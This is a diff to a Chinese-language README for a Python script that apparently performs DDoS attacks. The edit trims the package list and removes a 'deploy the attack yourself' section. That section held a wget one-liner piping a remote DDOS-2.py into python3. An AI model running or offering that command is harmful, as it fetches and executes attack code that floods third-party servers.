@@ -2,12 +2,10 @@
 此腳本基於Python 使用前請先確定電腦上有安裝Python
 
 ## 必要套件
-- webbrowser
 - request
-- socket
 
 ```js
-python -m pip install webbrowser, requests, socket
+python -m pip install requests
 ```
 
 ## 注意事項
@@ -32,8 +30,5 @@ python -m pip install webbrowser, requests, socket
 - DDOS攻擊第一版(By:Andysun06)
 - DDOS攻擊第二版(By:ChengChinHsia)
 
-## 親自部署攻擊
-```js
-wget -qO-  https://raw.githubusercontent.com/ChengChinHsia-Pig/pwd-gen/main/attacks/DDOS-2.py | python3 -
-```
+
 > Last Update:2022/09/11
